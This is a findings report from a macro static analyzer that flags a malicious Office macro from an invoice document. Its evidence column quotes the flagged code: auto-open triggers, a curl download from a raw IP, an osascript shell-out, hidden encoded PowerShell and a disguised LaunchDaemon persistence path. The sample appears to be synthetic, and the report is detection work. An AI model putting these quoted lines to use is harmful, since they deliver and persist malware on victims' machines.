# GraySentinel Macro Static Analyzer — Findings

- **Source:** `data/invoice_Q3.docm.extracted.bas`  
- **Scanned:** 2026-09-16T03:30:02Z · 34 lines  
- **Verdict:** **MALICIOUS**  
- **Severity mix:** 🔴 3 · 🟠 7 · 🟡 5 · 🔵 1

| # | Sev | Rule | ATT&CK | Line | Finding | Evidence |
|---|-----|------|--------|------|---------|----------|
| 1 | CRITICAL | MSA-04 | T1105 | 22 | Remote download cradle | `' [olevba deobfuscated] Shell "curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u"` |
| 2 | CRITICAL | MSA-02 | T1059.001 | 24 | PowerShell encoded-command execution | `CreateObject("WScript.Shell").Run "powershell -w hidden -enc " & stager, 0, False` |
| 3 | CRITICAL | MSA-07 | T1543.001 | 31 | macOS LaunchDaemon/Agent persistence | `plist = "/Library/LaunchDaemons/com.apple.softwareupdated.helper.plist"` |
| 4 | HIGH | MSA-01 | T1137.001 | 12 | Auto-execution trigger (AutoOpen/Document_Open) | `Sub AutoOpen()` |
| 5 | HIGH | MSA-01 | T1137.001 | 13 | Auto-execution trigger (AutoOpen/Document_Open) | `Document_Open` |
| 6 | HIGH | MSA-01 | T1137.001 | 16 | Auto-execution trigger (AutoOpen/Document_Open) | `Sub Document_Open()` |
| 7 | HIGH | MSA-05 | T1059.005 | 22 | Living-off-VBA runner (Shell/WScript.Shell) | `' [olevba deobfuscated] Shell "curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u"` |
| 8 | HIGH | MSA-03 | T1059.002 | 23 | AppleScript / osascript shell-out (macOS) | `Shell "osascript -e 'do shell script " & Chr(34) & "curl -s " & payloadUrl & " -o /tmp/.u" & Chr(34) & "'", vbHide` |
| 9 | HIGH | MSA-05 | T1059.005 | 23 | Living-off-VBA runner (Shell/WScript.Shell) | `Shell "osascript -e 'do shell script " & Chr(34) & "curl -s " & payloadUrl & " -o /tmp/.u" & Chr(34) & "'", vbHide` |
| 10 | HIGH | MSA-05 | T1059.005 | 24 | Living-off-VBA runner (Shell/WScript.Shell) | `CreateObject("WScript.Shell").Run "powershell -w hidden -enc " & stager, 0, False` |
| 11 | MEDIUM | MSA-09 | T1071.001 | 20 | Hard-coded C2 / beacon endpoint | `payloadUrl = "http://198.51.100.44/assets/update.bin"` |
| 12 | MEDIUM | MSA-06 | T1140 | 21 | Base64 / obfuscated blob | `stager = "cHJpbnQoJ1NZTlRIRVRJQyBTVEFHRVIgLSBOTyBQQVlMT0FEJyk="` |
| 13 | MEDIUM | MSA-09 | T1071.001 | 22 | Hard-coded C2 / beacon endpoint | `' [olevba deobfuscated] Shell "curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u"` |
| 14 | MEDIUM | MSA-08 | T1036.005 | 31 | Apple-service masquerade name | `plist = "/Library/LaunchDaemons/com.apple.softwareupdated.helper.plist"` |
| 15 | MEDIUM | MSA-09 | T1071.001 | 33 | Hard-coded C2 / beacon endpoint | `Debug.Print "would_beacon:http://203.0.113.9:8443/gate"` |
| 16 | LOW | MSA-10 | T1564.003 | 23 | Hidden-window execution flag | `Shell "osascript -e 'do shell script " & Chr(34) & "curl -s " & payloadUrl & " -o /tmp/.u" & Chr(34) & "'", vbHide` |

## Why each fired

- **MSA-04 (T1105)** — Fetches a second-stage payload from a remote host.
- **MSA-02 (T1059.001)** — Hidden/encoded PowerShell is a classic in-memory execution cradle.
- **MSA-07 (T1543.001)** — Writes a plist to survive reboot — persistence.
- **MSA-01 (T1137.001)** — Macro runs the moment the document opens — no user click needed.
- **MSA-01 (T1137.001)** — Macro runs the moment the document opens — no user click needed.
- **MSA-01 (T1137.001)** — Macro runs the moment the document opens — no user click needed.
- **MSA-05 (T1059.005)** — Spawns arbitrary processes from inside the macro.
- **MSA-03 (T1059.002)** — VBA pivoting to osascript to run macOS shell commands.
- **MSA-05 (T1059.005)** — Spawns arbitrary processes from inside the macro.
- **MSA-05 (T1059.005)** — Spawns arbitrary processes from inside the macro.
- **MSA-09 (T1071.001)** — Raw IP URL with a path — beacon/gate to an operator server.
- **MSA-06 (T1140)** — Long base64 literal — commonly a packed command or payload.
- **MSA-09 (T1071.001)** — Raw IP URL with a path — beacon/gate to an operator server.
- **MSA-08 (T1036.005)** — Names itself after a legit Apple service to blend in.
- **MSA-09 (T1071.001)** — Raw IP URL with a path — beacon/gate to an operator server.
- **MSA-10 (T1564.003)** — Runs children with no visible window to avoid the user noticing.
